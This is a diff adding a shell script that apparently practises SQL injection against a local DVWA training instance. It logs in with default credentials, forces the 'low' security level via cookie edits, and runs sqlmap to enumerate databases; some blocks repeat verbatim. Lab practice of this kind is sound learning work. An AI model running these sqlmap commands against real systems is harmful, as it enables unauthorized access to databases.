@@ -1,0 +1,48 @@
+cd ~
+SESSION=$(grep PHPSESSID cookies.txt | awk '{print $7}')
+echo "SESSION=$SESSION"
+
+
+curl -s -I --cookie "PHPSESSID=${SESSION}; security=low" \
+  "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=${SESSION}; security=low" -p id --batch --level=3 --risk=2 --dbs
+
+curl -s -c cookies.txt -d "username=admin&password=password&Login=Login" "http://127.0.0.1/dvwa/login.php" > /dev/null
+
+curl -s -b cookies.txt -c cookies.txt -d "security=low&seclev_submit=Submit" "http://127.0.0.1/dvwa/security.php" > /dev/null
+
+grep -i security cookies.txt || cat cookies.txt
+
+# make a backup first
+cp cookies.txt cookies.txt.bak
+
+# update the cookie file: set the cookie value to "low" when cookie name is "security"
+awk 'BEGIN{OFS="\t"} { if($6=="security") $7="low"; print }' cookies.txt > cookies.tmp && mv cookies.tmp cookies.txt
+
+# show the updated cookie line
+grep -i security cookies.txt || cat cookies.txt
+
+# make a backup first
+cp cookies.txt cookies.txt.bak
+
+# update the cookie file: set the cookie value to "low" when cookie name is "security"
+awk 'BEGIN{OFS="\t"} { if($6=="security") $7="low"; print }' cookies.txt > cookies.tmp && mv cookies.tmp cookies.txt
+
+# show the updated cookie line
+grep -i security cookies.txt || cat cookies.txt
+
+curl -s -I -b cookies.txt "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,8p'
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=${SESSION}; security=low" -p id --batch --level=3 --risk=2 --dbs
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  -b cookies.txt -p id --batch --level=3 --risk=2 --dbs
+
+echo "SESSION=$SESSION"
+echo "---- cookies.txt ----"; sed -n '1,200p' cookies.txt
+echo "---- curl -I with override cookie ----"
+curl -s -I --cookie "PHPSESSID=${SESSION}; security=low" "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,40p'
+
